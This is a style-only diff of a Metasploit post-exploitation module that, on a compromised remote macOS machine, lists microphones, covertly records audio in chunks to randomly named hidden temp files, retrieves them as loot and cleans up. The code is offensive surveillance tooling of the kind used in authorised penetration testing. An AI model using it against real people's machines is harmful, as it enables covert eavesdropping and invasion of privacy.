@@ -12,45 +12,46 @@ class MetasploitModule < Msf::Post
 
   POLL_TIMEOUT = 120
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OSX Manage Record Microphone',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OSX Manage Record Microphone',
+        'Description' => %q{
           This module will allow the user to detect (with the LIST action) and
           capture (with the RECORD action) audio inputs on a remote OSX machine.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev'],
-      'Platform'      => [ 'osx'],
-      'SessionTypes'  => [ 'shell' ],
-      'Actions'       => [
-        [ 'LIST',     { 'Description' => 'Show a list of microphones' } ],
-        [ 'RECORD', { 'Description' => 'Record from a selected audio input' } ]
-      ],
-      'DefaultAction' => 'LIST'
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'joev'],
+        'Platform' => [ 'osx'],
+        'SessionTypes' => [ 'shell' ],
+        'Actions' => [
+          [ 'LIST', { 'Description' => 'Show a list of microphones' } ],
+          [ 'RECORD', { 'Description' => 'Record from a selected audio input' } ]
+        ],
+        'DefaultAction' => 'LIST'
+      )
+    )
 
     register_options(
       [
         OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
         OptString.new('TMP_FILE',
-          [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
-        ),
+                      [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']),
         OptString.new('AUDIO_COMPRESSION',
-          [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']
-        ),
+                      [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']),
         OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
         OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
-      ])
+      ]
+    )
   end
-
 
   def run
     fail_with(Failure::BadConfig, "Invalid session ID selected.") if client.nil?
     fail_with(Failure::BadConfig, "Invalid action") if action.nil?
 
-    num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
-    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
+    num_chunks = (datastore['RECORD_LEN'].to_f / datastore['SYNC_WAIT'].to_f).ceil
+    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10) + '1' }
     ruby_cmd = osx_capture_media(
       :action => action.name.downcase,
       :snap_filetype => '',
@@ -88,13 +89,13 @@ class MetasploitModule < Msf::Post
                 rm_f(tmp_file)
                 # roll filename
                 base = File.basename(tmp_file, '.*') # returns it with no extension
-                num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
+                num = ((base.match(/\d+$/) || ['0'])[0].to_i + 1).to_s
                 ext = File.extname(tmp_file) || 'o'
-                tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
+                tmp_file = File.join(File.dirname(tmp_file), base + num + '.' + ext)
                 # store contents in file
-                title = "OSX Mic Recording "+i.to_s
+                title = "OSX Mic Recording " + i.to_s
                 f = store_loot(title, "audio/quicktime", session, contents,
-                  "osx_mic_rec#{i}.qt", title)
+                               "osx_mic_rec#{i}.qt", title)
                 print_good "Record file captured and saved to #{f}"
                 print_status "Rolling record file. "
                 break
@@ -112,6 +113,7 @@ class MetasploitModule < Msf::Post
 
   def cleanup
     return unless @cleaning_up.nil?
+
     @cleaning_up = true
 
     if action.name =~ /record/i and not @pid.nil?
